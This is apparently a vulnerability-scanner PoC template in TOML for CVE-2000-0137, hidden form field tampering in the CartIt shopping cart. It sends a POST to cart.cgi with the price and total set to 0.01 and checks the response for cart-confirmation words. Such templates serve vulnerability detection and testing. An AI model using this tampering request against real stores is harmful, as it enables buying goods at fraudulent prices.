[info]
author = "ave"
description = "检测 CartIt 购物车系统是否存在隐藏表单字段篡改漏洞。攻击者通过拦截并修改购物车表单提交中的隐藏字段（如商品价格、数量、总价等），服务端未对客户端提交的敏感字段进行完整性校验，可导致低价或免费购买商品。PoC 发送包含篡改后隐藏字段的 POST 请求，验证服务端是否信任客户端提交的隐藏参数。"
id = "POC-AVE-2000-0122"
name = "CartIt Hidden Form Field Tampering PoC"
severity = "high"
tags = [
    "cve-2000-0137",
    "form-tampering",
    "shopping-cart",
]
vuln_id = [
    "CVE-2000-0137",
    "AVE-2000-0122",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/cart.cgi"
protocol = "http"

[poc.requests.body]
content = "item=1001&quantity=1&price=0.01&total=0.01&action=add"
type = "raw"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "added to your cart",
    "order total",
    "checkout",
    "CartIt",
]
